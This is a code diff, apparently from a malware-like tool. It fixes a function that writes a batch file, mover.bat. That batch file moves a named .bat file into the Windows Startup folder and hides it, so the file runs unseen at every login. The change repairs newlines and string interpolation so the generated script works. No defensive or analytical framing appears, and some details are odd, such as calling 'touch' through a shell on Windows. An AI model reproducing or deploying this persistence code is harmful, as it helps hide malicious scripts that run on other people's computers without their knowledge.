@@ -41,12 +41,12 @@ void generate_mover(string file, string target) {
 	string file_path = $"{target}/mover.bat";
 	shell_exec($"touch {file_path}"); // CREATES EMPTY MOVER FILE
 	Thread.Sleep(3);
-	File.AppendAllText(file_path, "@echo off");
-	File.AppendAllText(file_path, "set \"source=%~dp0{file}.bat\"");
-	File.AppendAllText(file_path, "set \"startup=%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"");
-	File.AppendAllText(file_path, "move \"%source%\" \"%startup%\\\"");
-	File.AppendAllText(file_path, "attrib +h \"%startup%\\{file}.bat\"");
-	File.AppendAllText(file_path, "pause");
+	File.AppendAllText(file_path, "@echo off\n");
+	File.AppendAllText(file_path, $"set \"source=%~dp0{file}.bat\"\n");
+	File.AppendAllText(file_path, "set \"startup=%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\n");
+	File.AppendAllText(file_path, "move \"%source%\" \"%startup%\\\"\n");
+	File.AppendAllText(file_path, $"attrib +h \"%startup%\\{file}.bat\"\n");
+	File.AppendAllText(file_path, "pause\n");
 }
 
 void push_changes() {
